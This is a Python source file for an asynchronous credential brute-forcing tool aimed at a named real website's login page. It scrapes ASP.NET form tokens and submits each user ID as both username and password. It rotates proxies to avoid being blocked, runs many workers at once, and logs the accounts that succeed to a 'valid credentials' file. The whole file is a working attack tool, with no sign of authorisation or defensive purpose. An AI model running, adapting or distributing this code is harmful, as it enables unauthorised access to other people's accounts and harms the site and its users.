import asyncio
import aiohttp
from aiohttp import FormData
from bs4 import BeautifulSoup
from pathlib import Path
import argparse
import sys
from datetime import datetime
from typing import Optional, List, Dict
import json
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeRemainingColumn
from rich.panel import Panel
from rich.table import Table
from rich import box
import random

try:
    from aiohttp_socks import ProxyConnector
except ImportError:
    ProxyConnector = None

console = Console()


class ProxyManager:
    """Manages proxy rotation and validation"""

    def __init__(self, proxy_file: Optional[str] = None, proxy_list: Optional[List[str]] = None):
        self.proxies = []
        if proxy_file and Path(proxy_file).exists():
            with open(proxy_file, 'r') as f:
                self.proxies = [line.strip() for line in f if line.strip()]
        elif proxy_list:
            self.proxies = proxy_list
        self.current_index = 0

    def get_next_proxy(self) -> Optional[str]:
        """Get next proxy in rotation"""
        if not self.proxies:
            return None
        proxy = self.proxies[self.current_index % len(self.proxies)]
        self.current_index += 1
        return proxy

    def get_random_proxy(self) -> Optional[str]:
        """Get random proxy"""
        return random.choice(self.proxies) if self.proxies else None


class ResultsManager:
    """Manages saving results to file"""

    def __init__(self, output_file: str = "valid_credentials.txt"):
        self.output_file = output_file
        self.results = []
        self.lock = asyncio.Lock()

    async def save_valid(self, user_id: str, additional_info: Dict = None):
        """Save valid credential to file"""
        async with self.lock:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            result = {
                "user_id": user_id,
                "timestamp": timestamp,
                "status": "VALID"
            }
            if additional_info:
                result.update(additional_info)

            self.results.append(result)

            # Append to text file
            with open(self.output_file, 'a', encoding='utf-8') as f:
                f.write(f"[{timestamp}] Valid: {user_id}\n")

            # Save JSON format
            json_file = self.output_file.replace('.txt', '.json')
            with open(json_file, 'w', encoding='utf-8') as f:
                json.dump(self.results, f, indent=2, ensure_ascii=False)


class Statistics:
    """Track statistics"""

    def __init__(self):
        self.total = 0
        self.checked = 0
        self.valid = 0
        self.invalid = 0
        self.errors = 0
        self.start_time = datetime.now()

    def get_stats_table(self) -> Table:
        """Generate statistics table"""
        table = Table(box=box.ROUNDED, show_header=False, padding=(0, 1))
        table.add_column(style="cyan bold")
        table.add_column(style="white")

        elapsed = (datetime.now() - self.start_time).total_seconds()
        rate = self.checked / elapsed if elapsed > 0 else 0

        table.add_row("Total", str(self.total))
        table.add_row("Checked", str(self.checked))
        table.add_row("✓ Valid", f"[green]{self.valid}[/green]")
        table.add_row("✗ Invalid", f"[red]{self.invalid}[/red]")
        table.add_row("⚠ Errors", f"[yellow]{self.errors}[/yellow]")
        table.add_row("Speed", f"{rate:.2f} req/s")

        return table


class Checker:
    """Advanced credential checker with retry and proxy support"""

    def __init__(
        self,
        proxy_manager: Optional[ProxyManager] = None,
        results_manager: Optional[ResultsManager] = None,
        max_retries: int = 3,
        timeout: int = 30
    ):
        self.proxy_manager = proxy_manager
        self.results_manager = results_manager
        self.max_retries = max_retries
        self.timeout = timeout
        self.api_url = "https://elevatorcity.ge/Login/Authentication.aspx"
        self.sessions = {}
        self.stats = Statistics()

    async def create_session(self, proxy: Optional[str] = None) -> aiohttp.ClientSession:
        """Create session with optional proxy"""
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        }

        connector = None
        if proxy:
            if proxy.startswith('socks'):
                if ProxyConnector is None:
                    console.print("[yellow]⚠ SOCKS proxy requested but aiohttp-socks not installed[/yellow]")
                else:
                    connector = ProxyConnector.from_url(proxy)
            else:
                # HTTP/HTTPS proxy
                pass

        timeout_config = aiohttp.ClientTimeout(total=self.timeout)

        session = aiohttp.ClientSession(
            headers=headers,
            connector=connector,
            timeout=timeout_config,
            trust_env=True
        )

        # Set proxy for HTTP/HTTPS if not SOCKS
        if proxy and not proxy.startswith('socks'):
            session._proxy = proxy

        return session

    async def close_all_sessions(self):
        """Close all active sessions"""
        for session in self.sessions.values():
            await session.close()
        self.sessions.clear()

    async def parse_hidden_inputs(self, session: aiohttp.ClientSession) -> Optional[Dict]:
        """Parse hidden inputs from page"""
        try:
            proxy = session._proxy if hasattr(session, '_proxy') else None
            async with session.get(self.api_url, proxy=proxy) as response:
                if response.status == 200:
                    html = await response.text()
                    soup = BeautifulSoup(html, 'lxml')
                    hidden_inputs = soup.find_all("input", type="hidden")
                    inputs = {}
                    for hidden_input in hidden_inputs:
                        name = hidden_input.get("name")
                        value = hidden_input.get("value", "")
                        inputs[name] = value
                    return inputs
        except Exception as e:
            console.print(f"[yellow]⚠ Error parsing hidden inputs: {e}[/yellow]")
            return None

    async def check_credential(self, user_id: str, retry_count: int = 0) -> bool:
        """Check single credential with retry logic"""
        proxy = self.proxy_manager.get_random_proxy() if self.proxy_manager else None

        try:
            # Create or reuse session
            session_key = proxy if proxy else 'default'
            if session_key not in self.sessions:
                self.sessions[session_key] = await self.create_session(proxy)

            session = self.sessions[session_key]

            # Parse hidden inputs
            hidden_inputs = await self.parse_hidden_inputs(session)
            if not hidden_inputs:
                raise Exception("Failed to retrieve hidden inputs")

            __VIEWSTATE = hidden_inputs.get("__VIEWSTATE")
            __VIEWSTATEGENERATOR = hidden_inputs.get("__VIEWSTATEGENERATOR")
            __EVENTVALIDATION = hidden_inputs.get("__EVENTVALIDATION")

            if not __VIEWSTATE or not __VIEWSTATEGENERATOR or not __EVENTVALIDATION:
                raise Exception("Essential hidden inputs are missing")

            # Prepare form data
            form = FormData()
            form.add_fields(
                ("__VIEWSTATE", __VIEWSTATE),
                ("__VIEWSTATEGENERATOR", __VIEWSTATEGENERATOR),
                ("__EVENTVALIDATION", __EVENTVALIDATION),
                ("__EVENTTARGET", "ButtonLogin"),
                ("TextUsername", user_id),
                ("TextPassword", user_id)
            )

            # Make request
            proxy_param = session._proxy if hasattr(session, '_proxy') else None
            async with session.post(self.api_url, data=form, allow_redirects=False, proxy=proxy_param) as response:
                if response.status == 302:
                    # Valid credentials found
                    if self.results_manager:
                        await self.results_manager.save_valid(user_id, {"proxy": proxy})
                    self.stats.valid += 1
                    return True
                else:
                    # Invalid credentials
                    self.stats.invalid += 1
                    return False

        except Exception as e:
            # Retry logic
            if retry_count < self.max_retries:
                await asyncio.sleep(1 * (retry_count + 1))  # Exponential backoff
                return await self.check_credential(user_id, retry_count + 1)
            else:
                self.stats.errors += 1
                console.print(f"[red]✗[/red] Error checking {user_id}: {str(e)[:50]}")
                return False

        finally:
            self.stats.checked += 1


class BruteForcer:
    """Main bruteforce orchestrator"""

    def __init__(
        self,
        user_ids: List[str],
        max_workers: int = 10,
        proxy_manager: Optional[ProxyManager] = None,
        results_manager: Optional[ResultsManager] = None,
        max_retries: int = 3,
        timeout: int = 30
    ):
        self.user_ids = user_ids
        self.max_workers = max_workers
        self.semaphore = asyncio.Semaphore(max_workers)
        self.checker = Checker(proxy_manager, results_manager, max_retries, timeout)
        self.checker.stats.total = len(user_ids)

    async def process_user_id(self, user_id: str, progress: Progress, task_id):
        """Process single user ID with semaphore"""
        async with self.semaphore:
            result = await self.checker.check_credential(user_id)
            progress.update(task_id, advance=1)

            if result:
                console.print(f"[green]✓[/green] Valid: [bold green]{user_id}[/bold green]")

            return result

    async def run(self):
        """Run the bruteforce process"""
        console.print(Panel.fit(
            "[bold cyan]Advanced Credential Testing Tool[/bold cyan]\n"
            f"Total targets: {len(self.user_ids)} | Workers: {self.max_workers}",
            border_style="cyan"
        ))

        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            TextColumn("({task.completed}/{task.total})"),
            TimeRemainingColumn(),
            console=console
        ) as progress:
            task = progress.add_task("[cyan]Checking credentials...", total=len(self.user_ids))

            tasks = [
                self.process_user_id(user_id, progress, task)
                for user_id in self.user_ids
            ]

            await asyncio.gather(*tasks)

        await self.checker.close_all_sessions()

        # Display final statistics
        console.print("\n")
        console.print(Panel(
            self.checker.stats.get_stats_table(),
            title="[bold cyan]Final Statistics[/bold cyan]",
            border_style="cyan"
        ))


async def main():
    parser = argparse.ArgumentParser(
        description="Advanced Multi-threaded Credential Testing Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -f users.txt -w 20
  %(prog)s -f users.txt -p proxies.txt -w 50
  %(prog)s -u 01911105338 01922334455
  %(prog)s -f users.txt --proxy-file proxies.txt --output results.txt
        """
    )

    parser.add_argument('-f', '--file', help='File with user IDs (one per line)')
    parser.add_argument('-u', '--users', nargs='+', help='User IDs to check')
    parser.add_argument('-w', '--workers', type=int, default=10, help='Number of concurrent workers (default: 10)')
    parser.add_argument('-p', '--proxy-file', help='File with proxies (one per line, format: http://ip:port or socks5://ip:port)')
    parser.add_argument('-o', '--output', default='valid_credentials.txt', help='Output file for valid credentials')
    parser.add_argument('-r', '--retries', type=int, default=3, help='Max retries per request (default: 3)')
    parser.add_argument('-t', '--timeout', type=int, default=30, help='Request timeout in seconds (default: 30)')

    args = parser.parse_args()

    # Load user IDs
    user_ids = []
    if args.file:
        if not Path(args.file).exists():
            console.print(f"[red]✗ File not found: {args.file}[/red]")
            sys.exit(1)
        with open(args.file, 'r') as f:
            user_ids = [line.strip() for line in f if line.strip()]
    elif args.users:
        user_ids = args.users
    else:
        console.print("[red]✗ Please provide user IDs via -f or -u[/red]")
        parser.print_help()
        sys.exit(1)

    if not user_ids:
        console.print("[red]✗ No user IDs to check[/red]")
        sys.exit(1)

    # Initialize proxy manager
    proxy_manager = ProxyManager(proxy_file=args.proxy_file) if args.proxy_file else None

    # Initialize results manager
    results_manager = ResultsManager(output_file=args.output)

    # Create and run bruteforcer
    bruteforcer = BruteForcer(
        user_ids=user_ids,
        max_workers=args.workers,
        proxy_manager=proxy_manager,
        results_manager=results_manager,
        max_retries=args.retries,
        timeout=args.timeout
    )

    await bruteforcer.run()

    console.print(f"\n[green]✓[/green] Results saved to: [bold]{args.output}[/bold]")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        console.print("\n[yellow]⚠ Interrupted by user[/yellow]")
        sys.exit(0)